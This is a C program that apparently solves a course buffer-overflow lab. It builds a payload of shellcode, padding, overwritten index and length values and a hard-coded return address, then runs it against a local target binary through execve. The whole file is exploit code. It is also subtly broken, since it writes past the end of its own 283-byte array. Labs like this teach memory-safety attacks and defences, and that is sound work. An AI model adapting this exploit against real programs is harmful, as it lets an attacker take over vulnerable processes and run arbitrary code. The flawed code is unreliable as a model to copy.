#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

#define DEBUG 0

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[2];
	
	args[0] = TARGET;
	// Write a value greater than 272 (to overwrite len)
	char exploit[283];
	strcpy(exploit, shellcode);
	int i = 0;
	for (i = 45; i < 270; i++) {
		exploit[i] = 0x01;
	}
	for (i = 270; i < 272; i++) {
		exploit[i] = 0x00;
	}
	for (i = 272; i < 285; i++) {
		exploit[i] = 0x01;
	}
	char overwrite_val = 0x0B; // 267
	char* overwrite_i = (char*) (exploit + 264);
        *overwrite_i = overwrite_val;
	overwrite_val = 0x1B; // 283
	char* overwrite_len = (char*) (exploit + 268);
	*overwrite_len = overwrite_val;
	int return_add = 0x2021fd40;
	int* overwrite_ret = (int*) (exploit + 280);
	*overwrite_ret = return_add;
	exploit[284] = '\0';
        if (DEBUG) {
                printf("Length: %d\n", strlen(exploit));
                // Print out buffer to debug
                for (i = 0; i < 285; i++) {
                        printf("%x ", 0xff & exploit[i]);
                }
                fflush(stdout);
        }
	args[1] = exploit;
	args[2] = NULL;

	env[0] = &exploit[271];
	env[1] = &exploit[272];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
